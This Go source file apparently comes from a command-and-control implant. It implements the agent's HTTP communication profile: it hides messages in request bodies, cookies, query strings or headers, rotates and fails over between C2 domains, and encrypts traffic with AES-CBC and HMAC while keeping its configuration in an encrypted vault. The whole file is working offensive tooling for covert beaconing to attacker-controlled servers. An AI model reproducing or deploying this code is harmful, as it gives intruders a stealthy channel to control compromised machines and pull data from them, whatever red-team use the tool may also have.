package httpx

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	mrand "math/rand"
	"net/http"
	"net/url"
	"strings"

	"github.com/andybalholm/brotli"
)

// the HTTP request using the appropriate verb, URI, and domain.
func (h *HTTPXProfile) sendMessage(data []byte, verbCfg *VerbConfig, cfg *sensitiveConfig) (*http.Response, error) {
	// Apply client transforms forward
	transformed, err := ApplyTransformsForward(data, verbCfg.Client.Transforms)
	if err != nil {
		return nil, fmt.Errorf("client transforms failed: %w", err)
	}

	// Select domain
	domain := h.selectDomain(cfg)

	// Select URI (round-robin)
	uri := h.selectURI(verbCfg)

	// Build the request URL
	reqURL := strings.TrimRight(domain, "/") + uri

	// Build request based on message location
	var req *http.Request
	loc := verbCfg.Client.Message.Location
	verb := strings.ToUpper(verbCfg.Verb)
	if verb == "" {
		verb = "GET"
	}

	switch loc {
	case "body", "":
		req, err = http.NewRequest(verb, reqURL, bytes.NewReader(transformed))
	case "cookie":
		req, err = http.NewRequest(verb, reqURL, nil)
		if err == nil {
			req.AddCookie(&http.Cookie{
				Name:  verbCfg.Client.Message.Name,
				Value: string(transformed),
			})
		}
	case "query":
		parsedURL, parseErr := url.Parse(reqURL)
		if parseErr != nil {
			return nil, fmt.Errorf("failed to parse URL: %w", parseErr)
		}
		q := parsedURL.Query()
		q.Set(verbCfg.Client.Message.Name, string(transformed))
		parsedURL.RawQuery = q.Encode()
		req, err = http.NewRequest(verb, parsedURL.String(), nil)
	case "header":
		req, err = http.NewRequest(verb, reqURL, nil)
		if err == nil {
			req.Header.Set(verbCfg.Client.Message.Name, string(transformed))
		}
	default:
		req, err = http.NewRequest(verb, reqURL, bytes.NewReader(transformed))
	}

	if err != nil {
		h.recordFailure()
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set client headers from config
	for k, v := range verbCfg.Client.Headers {
		req.Header.Set(k, v)
	}

	// Set query parameters from config
	if len(verbCfg.Client.Parameters) > 0 {
		q := req.URL.Query()
		for k, v := range verbCfg.Client.Parameters {
			q.Set(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}

	// Set domain-specific headers
	if cfg.Config != nil {
		domainHost := extractHost(domain)
		if dsh, ok := verbCfg.Client.DomainSpecificHeaders[domainHost]; ok {
			for k, v := range dsh {
				req.Header.Set(k, v)
			}
		}
	}

	resp, err := h.client.Do(req)
	if err != nil {
		if resp != nil && resp.Body != nil {
			resp.Body.Close()
		}
		h.recordFailure()
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}

	// Success — reset failure count
	h.failCount.Store(0)
	return resp, nil
}

// receiveMessage reads the response body and reverses server transforms.
func (h *HTTPXProfile) receiveMessage(resp *http.Response, verbCfg *VerbConfig) ([]byte, error) {
	body, err := readResponseBody(resp)
	if err != nil {
		return nil, err
	}

	// Reverse server transforms
	return ApplyTransformsReverse(body, verbCfg.Server.Transforms)
}

// selectDomain picks the next domain based on the rotation strategy.
func (h *HTTPXProfile) selectDomain(cfg *sensitiveConfig) string {
	domains := cfg.Domains
	if len(domains) == 0 {
		return ""
	}
	if len(domains) == 1 {
		return domains[0]
	}

	switch h.DomainRotation {
	case "round-robin":
		idx := h.activeDomainIdx.Add(1) - 1
		return domains[int(idx)%len(domains)]
	case "random":
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(domains))))
		if err != nil {
			return domains[mrand.Intn(len(domains))]
		}
		return domains[n.Int64()]
	default: // "fail-over"
		idx := int(h.activeDomainIdx.Load())
		if idx >= len(domains) {
			idx = 0
		}
		return domains[idx]
	}
}

// recordFailure increments the failure counter and triggers failover if threshold exceeded.
func (h *HTTPXProfile) recordFailure() {
	if h.DomainRotation != "fail-over" {
		return
	}
	count := h.failCount.Add(1)
	if int(count) >= h.FailoverThreshold {
		h.failCount.Store(0)
		h.activeDomainIdx.Add(1)
		log.Printf("failover: switched domain")
	}
}

// selectURI picks the next URI from the verb config, rotating round-robin.
func (h *HTTPXProfile) selectURI(verbCfg *VerbConfig) string {
	uris := verbCfg.URIs
	if len(uris) == 0 {
		return "/"
	}

	// Use verb-appropriate counter based on whether this is get or post config.
	// Since we don't know which verb config this is, use a shared counter per direction.
	// The caller context (Get vs Post) determines which counter is used.
	idx := h.uriIdx.Add(1) - 1
	return uris[int(idx)%len(uris)]
}

// extractHost extracts the hostname from a full URL for domain-specific header matching.
func extractHost(rawURL string) string {
	if u, err := url.Parse(rawURL); err == nil {
		return u.Hostname()
	}
	return rawURL
}

// getString safely gets a string value from a map.
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// readResponseBody reads and decompresses the response body if needed.
func readResponseBody(resp *http.Response) ([]byte, error) {
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		gr, err := gzip.NewReader(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("gzip decompression failed: %w", err)
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "br":
		return io.ReadAll(brotli.NewReader(resp.Body))
	default:
		return io.ReadAll(resp.Body)
	}
}

// Encryption/decryption methods — same Freyja format as HTTP profile.

func (h *HTTPXProfile) encryptMessage(msg []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return msg, nil
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %w", err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	padded := pkcs7Pad(msg, aes.BlockSize)
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	ivCiphertext := append(iv, encrypted...) //nolint:gocritic // intentional: construct new slice
	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)

	return append(ivCiphertext, hmacHash.Sum(nil)...), nil
}

func (h *HTTPXProfile) decryptResponse(data []byte, encKey string) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	// Response format: UUID (36 bytes) + IV (16) + Ciphertext + HMAC (32)
	if len(data) < 36 {
		return nil, fmt.Errorf("response too short for UUID prefix")
	}
	data = data[36:] // Strip UUID prefix

	if len(data) < aes.BlockSize+sha256.Size {
		return nil, fmt.Errorf("response too short for decryption")
	}

	// Verify HMAC
	hmacStart := len(data) - sha256.Size
	ivCiphertext := data[:hmacStart]
	expectedHMAC := data[hmacStart:]

	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	if !hmac.Equal(hmacHash.Sum(nil), expectedHMAC) {
		return nil, fmt.Errorf("HMAC verification failed")
	}

	// Decrypt
	iv := ivCiphertext[:aes.BlockSize]
	ciphertext := ivCiphertext[aes.BlockSize:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	return pkcs7Unpad(plaintext)
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	padding := int(data[len(data)-1])
	if padding > len(data) || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	for i := len(data) - padding; i < len(data); i++ {
		if data[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding byte")
		}
	}
	return data[:len(data)-padding], nil
}

// Config vault helpers — same AES-256-GCM pattern as HTTP profile.

func vaultEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

func vaultDecrypt(key, blob []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	if len(blob) < gcm.NonceSize() {
		return nil
	}
	nonce := blob[:gcm.NonceSize()]
	ciphertext := blob[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// ParseAgentConfig parses the raw_c2_config JSON into an AgentConfig struct.
func ParseAgentConfig(data []byte) (*AgentConfig, error) {
	var cfg AgentConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("failed to parse agent config: %w", err)
	}
	return &cfg, nil
}
